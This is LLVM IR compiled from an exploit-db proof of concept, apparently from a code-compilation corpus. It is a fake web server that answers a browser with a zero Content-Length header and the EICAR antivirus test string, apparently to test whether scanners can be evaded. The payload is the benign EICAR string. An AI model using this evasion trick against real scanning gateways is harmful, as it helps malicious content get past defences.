; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21339.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21339.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.header = private unnamed_addr constant [92 x i8] c"HTTP/1.0 200 OK\0D\0AConnection: close\0D\0AContent-Type: application/binary\0D\0AContent-Length: 0\0D\0A\0D\0A\00", align 16
@__const.main.eicar = private unnamed_addr constant [69 x i8] c"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\00", align 16
@.str = private unnamed_addr constant [16 x i8] c"Usage: %s port\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"Fake web server starting......\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"bind\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"Listening on port %i/tcp\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"connection from: %s\0A\00", align 1
@BUFFERSIZE = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [21 x i8] c"\0AData from Browser:\0A\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"sending: \0A%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [14 x i8] c"Terminating.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i16, align 2
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca %struct.in_addr, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [92 x i8], align 16
  %18 = alloca [69 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = bitcast [92 x i8]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %19, i8* align 16 getelementptr inbounds ([92 x i8], [92 x i8]* @__const.main.header, i32 0, i32 0), i64 92, i1 false)
  %20 = bitcast [69 x i8]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %20, i8* align 16 getelementptr inbounds ([69 x i8], [69 x i8]* @__const.main.eicar, i32 0, i32 0), i64 69, i1 false)
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %25, label %31

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i8* %28)
  %30 = call i32 @exit(i32 1) #4
  unreachable

31:                                               ; preds = %2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call zeroext i16 @atoi(i8* %34)
  store i16 %35, i16* %10, align 2
  br label %36

36:                                               ; preds = %31
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %38 = load i32, i32* @AF_INET, align 4
  %39 = load i32, i32* @SOCK_STREAM, align 4
  %40 = call i32 @socket(i32 %38, i32 %39, i32 6)
  store i32 %40, i32* %9, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp slt i32 %41, 0
  br i1 %42, label %43, label %46

43:                                               ; preds = %36
  %44 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %45 = call i32 @exit(i32 -1) #4
  unreachable

46:                                               ; preds = %36
  %47 = load i32, i32* @AF_INET, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %47, i32* %48, align 4
  %49 = load i16, i16* %10, align 2
  %50 = call i32 @htons(i16 zeroext %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %50, i32* %51, align 4
  %52 = load i32, i32* @INADDR_ANY, align 4
  %53 = call i32 @htonl(i32 %52)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* %9, align 4
  %57 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %58 = call i32 @bind(i32 %56, %struct.sockaddr* %57, i32 4)
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* %8, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %64

61:                                               ; preds = %46
  %62 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %63 = call i32 @exit(i32 -1) #4
  unreachable

64:                                               ; preds = %46
  %65 = load i32, i32* %9, align 4
  %66 = call i32 @listen(i32 %65, i32 5)
  store i32 %66, i32* %8, align 4
  %67 = load i32, i32* %8, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %69, label %72

69:                                               ; preds = %64
  %70 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %71 = call i32 @exit(i32 -1) #4
  unreachable

72:                                               ; preds = %64
  %73 = load i16, i16* %10, align 2
  %74 = zext i16 %73 to i32
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i32 %74)
  %76 = load i32, i32* %9, align 4
  %77 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %78 = call i32 @accept(i32 %76, %struct.sockaddr* %77, i32* %7)
  store i32 %78, i32* %6, align 4
  %79 = load i32, i32* %6, align 4
  %80 = icmp slt i32 %79, 0
  br i1 %80, label %81, label %84

81:                                               ; preds = %72
  %82 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %83 = call i32 @exit(i32 -1) #4
  unreachable

84:                                               ; preds = %72
  %85 = call i8* @calloc(i32 24, i32 1)
  store i8* %85, i8** %14, align 8
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %87 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  %89 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %13, i32 0, i32 0
  store i32 %88, i32* %89, align 4
  %90 = load i8*, i8** %14, align 8
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %13, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @inet_ntoa(i32 %92)
  %94 = call i32 @strncpy(i8* %90, i32 %93, i32 24)
  %95 = load i8*, i8** %14, align 8
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i8* %95)
  %97 = load i32, i32* @BUFFERSIZE, align 4
  %98 = call i8* @calloc(i32 %97, i32 1)
  store i8* %98, i8** %15, align 8
  %99 = load i32, i32* %6, align 4
  %100 = load i8*, i8** %15, align 8
  %101 = load i32, i32* @BUFFERSIZE, align 4
  %102 = call i32 @recv(i32 %99, i8* %100, i32 %101, i32 0)
  store i32 %102, i32* %8, align 4
  %103 = load i8*, i8** %15, align 8
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  store i8 0, i8* %106, align 1
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %108)
  %110 = load i32, i32* @BUFFERSIZE, align 4
  %111 = call i8* @calloc(i32 %110, i32 1)
  store i8* %111, i8** %16, align 8
  %112 = load i8*, i8** %16, align 8
  %113 = getelementptr inbounds [92 x i8], [92 x i8]* %17, i64 0, i64 0
  %114 = call i32 @strcat(i8* %112, i8* %113)
  %115 = load i8*, i8** %16, align 8
  %116 = getelementptr inbounds [69 x i8], [69 x i8]* %18, i64 0, i64 0
  %117 = call i32 @strcat(i8* %115, i8* %116)
  %118 = load i8*, i8** %16, align 8
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i8* %118)
  %120 = load i32, i32* %6, align 4
  %121 = load i8*, i8** %16, align 8
  %122 = load i8*, i8** %16, align 8
  %123 = call i32 @strlen(i8* %122)
  %124 = call i32 @write(i32 %120, i8* %121, i32 %123)
  store i32 %124, i32* %8, align 4
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.11, i64 0, i64 0))
  %126 = load i32, i32* %6, align 4
  %127 = call i32 @close(i32 %126)
  %128 = load i32, i32* %9, align 4
  %129 = call i32 @close(i32 %128)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local zeroext i16 @atoi(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i16 zeroext) #2

declare dso_local i32 @htonl(i32) #2

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @listen(i32, i32) #2

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #2

declare dso_local i8* @calloc(i32, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @inet_ntoa(i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
